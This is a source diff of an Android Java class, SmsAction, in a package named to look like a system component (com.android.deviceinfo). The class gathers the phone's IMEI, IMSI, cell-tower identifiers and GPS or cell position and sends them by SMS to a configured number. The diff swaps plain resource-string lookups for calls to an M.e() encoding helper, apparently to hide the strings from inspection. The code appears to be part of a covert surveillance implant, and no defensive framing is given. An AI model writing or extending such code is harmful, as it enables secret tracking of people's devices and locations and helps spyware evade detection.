@@ -12,17 +12,11 @@ package com.android.deviceinfo.action;
 import java.util.Date;
 import java.util.Locale;
 
-import android.content.Context;
 import android.location.Location;
-import android.location.LocationListener;
-import android.location.LocationManager;
-import android.os.Bundle;
 import android.telephony.SmsManager;
 
 import com.android.deviceinfo.CellInfo;
 import com.android.deviceinfo.Device;
-import com.android.deviceinfo.Messages;
-import com.android.deviceinfo.Status;
 import com.android.deviceinfo.Trigger;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.ConfAction;
@@ -32,7 +26,7 @@ import com.android.deviceinfo.module.position.GPSLocationListener;
 import com.android.deviceinfo.module.position.GPSLocatorAuto;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.StringUtils;
-import com.android.deviceinfo.util.Utils;
+import com.android.m.M;
 
 /**
  * The Class SmsAction.
@@ -113,8 +107,8 @@ public class SmsAction extends SubAction implements GPSLocationListener {
 				}
 
 				if (Device.isGprs()) {
-					sb.append(Messages.getString("1_9") + device.getImei() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
-					sb.append(Messages.getString("1_11") + device.getImsi() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+					sb.append(M.e("IMEI: ") + device.getImei() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+					sb.append(M.e("IMSI: ") + device.getImsi() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
 				}
 
 				text = sb.toString();
@@ -168,7 +162,7 @@ public class SmsAction extends SubAction implements GPSLocationListener {
 				return true;
 
 			case TYPE_SIM:
-				text = Messages.getString("1_0") + Device.self().getImsi(); //$NON-NLS-1$
+				text = M.e("IMSI: ") + Device.self().getImsi(); //$NON-NLS-1$
 				sendSMS(text);
 				return true;
 
@@ -196,7 +190,7 @@ public class SmsAction extends SubAction implements GPSLocationListener {
 	 */
 	private void errorLocation() {
 		if (!getCellPosition()) {
-			sendSMS(Messages.getString("1_8")); //$NON-NLS-1$
+			sendSMS(M.e("Cell and GPS info not available")); //$NON-NLS-1$
 		}
 	}
 
@@ -209,13 +203,13 @@ public class SmsAction extends SubAction implements GPSLocationListener {
 		final CellInfo c = Device.getCellInfo();
 
 		if (c.cdma && c.valid) {
-			text = Messages.getString("1_1") + c.sid + Messages.getString("1_2") + c.nid + Messages.getString("1_3") + c.bid; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
+			text = M.e("SID: ") + c.sid + M.e(", NID: ") + c.nid + M.e(", BID: ") + c.bid; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
 			sendSMS(text);
 			return true;
 		}
 
 		if (c.gsm && c.valid) {
-			text = Messages.getString("1_4") + c.mcc + Messages.getString("1_5") + c.mnc + Messages.getString("1_6") + c.lac + Messages.getString("1_7") + c.cid; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
+			text = M.e("CC: ") + c.mcc + M.e(", MNC: ") + c.mnc + M.e(", LAC: ") + c.lac + M.e(", CID: ") + c.cid; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
 			sendSMS(text);
 			return true;
 		}
@@ -257,9 +251,9 @@ public class SmsAction extends SubAction implements GPSLocationListener {
 	public String toString() {
 		final StringBuffer sb = new StringBuffer();
 
-		sb.append(Messages.getString("1_13") + type); //$NON-NLS-1$
-		sb.append(Messages.getString("1_14") + number); //$NON-NLS-1$
-		sb.append(Messages.getString("1_15") + text); //$NON-NLS-1$
+		sb.append(M.e("Sms type: ") + type); //$NON-NLS-1$
+		sb.append(M.e(" number: ") + number); //$NON-NLS-1$
+		sb.append(M.e(" text: ") + text); //$NON-NLS-1$
 
 		return sb.toString();
 	}
